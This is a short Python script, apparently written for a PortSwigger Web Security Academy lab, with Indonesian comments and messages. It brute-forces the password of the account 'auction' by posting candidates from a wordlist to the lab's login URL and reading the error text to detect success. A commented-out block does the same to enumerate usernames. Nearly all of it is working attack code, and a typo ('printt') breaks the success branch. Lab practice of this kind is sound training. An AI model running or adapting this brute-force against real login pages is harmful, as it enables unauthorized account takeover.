import requests
from bs4 import BeautifulSoup

#username = open("username.txt","r").readlines()
username = "auction"
password = open("password.txt","r").readlines()
url = "https://0a52005304224adac1ff0eeb00fb0053.web-security-academy.net/login"

for pas in password:
	pas = pas.replace("\n","")
	#auction
	data = f"username=auction&password={pas}"

	print(data)

	response = requests.post(url,data=data)
	soup = str(BeautifulSoup(response.text, 'html.parser').find('p', class_='is-warning').get_text().strip())
	print(soup)
	if soup != 'Incorrect password':
		print(f"ketemu password nya {pas}")
		printt(f"jadi username:{username} password: {pas}")
		break
	else:
		print("tidak ketemu")
	'''if soup != "Invalid username":
					print(f"ketemu usernya {user}")
					break
				else:
					print(f"tidak ketemu user {user}")'''

	